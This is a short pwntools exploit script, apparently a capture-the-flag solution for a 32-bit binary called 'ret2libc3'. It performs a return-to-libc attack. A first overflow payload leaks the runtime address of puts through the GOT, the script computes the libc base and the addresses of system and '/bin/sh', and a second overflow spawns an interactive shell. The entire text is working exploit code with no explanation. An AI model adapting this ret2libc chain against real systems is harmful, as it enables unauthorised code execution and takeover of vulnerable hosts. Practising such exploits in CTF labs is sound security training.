from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_plt = elf.plt['puts']
print("puts_plt:", hex(puts_plt))
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload1 = b'A' * 112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.sendlineafter('Can you find it !?', payload1)

puts_addr = u32(p.recv()[0:4])
print("puts_addr:", hex(puts_addr))

libc = ELF('libc-2.31.so')
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * 104 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
p.sendline(payload2)
p.interactive()